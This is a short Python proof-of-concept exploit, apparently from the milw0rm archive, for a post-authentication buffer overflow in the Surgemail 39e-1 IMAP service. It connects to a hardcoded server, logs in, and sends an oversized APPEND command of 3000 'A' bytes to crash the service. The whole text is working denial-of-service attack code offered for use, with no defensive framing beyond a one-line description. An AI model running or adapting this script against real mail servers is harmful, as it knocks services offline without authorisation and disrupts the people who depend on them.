#!/usr/bin/python
#
# Surgemail version 39e-1 - (0day) Post Auth IMAP Buffer overflow DoS.
# Discovered by: Travis Warren
# 
# The IMAP service contains a buffer overflow in the APPEND command. 
# 
#


import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer = '\x41' * 3000

s.connect(('192.168.0.103',143))
s.recv(1024)
s.send('A001 LOGIN user@test.com user ' + buffer + '\r\n')
s.recv(1024)
s.send('A001 APPEND ' + buffer + '\r\n')
s.recv(1024)
s.close()

# milw0rm.com [2008-06-30]
